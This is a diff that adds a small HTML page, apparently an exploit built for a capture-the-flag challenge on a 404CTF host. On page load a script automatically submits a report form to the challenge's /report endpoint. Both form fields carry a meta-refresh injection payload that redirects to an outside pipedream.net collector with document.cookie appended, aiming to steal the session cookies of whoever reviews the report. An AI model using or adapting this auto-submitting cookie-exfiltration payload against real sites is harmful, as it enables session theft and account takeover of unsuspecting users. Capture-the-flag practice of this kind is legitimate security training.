@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Autoposter Report</title>
+  </head>
+  <body>
+    <section class="report-form">
+      <h2>🛑 Report Incorrect Information</h2>
+      <form action="https://spacefleetcommand.404ctf.fr/report" method="POST">
+        <label for="url">URL of the incorrect spaceship page</label>
+        <textarea id="url" name="url" rows="5">
+<meta http-equiv="refresh" content="0;url=https://eoyi24wnc60zgb.m.pipedream.net/?c='+document.cookie+'">
+        <!-- Test -->
+      </textarea
+        >
+
+        <label for="issue">What’s wrong?</label>
+        <textarea id="issue" name="issue" rows="5">
+<meta http-equiv="refresh" content="0;url=https://eoyi24wnc60zgb.m.pipedream.net/?c='+document.cookie+'">
+      </textarea
+        >
+
+        <button type="submit">Send Report</button>
+
+        <div class="message">The URL <i>test</i> is not valid.</div>
+      </form>
+    </section>
+
+    <script>
+      // Dès que le DOM est chargé, on soumet le formulaire automatiquement
+      window.addEventListener("DOMContentLoaded", function () {
+        document.querySelector("form").submit();
+      });
+    </script>
+  </body>
+</html>
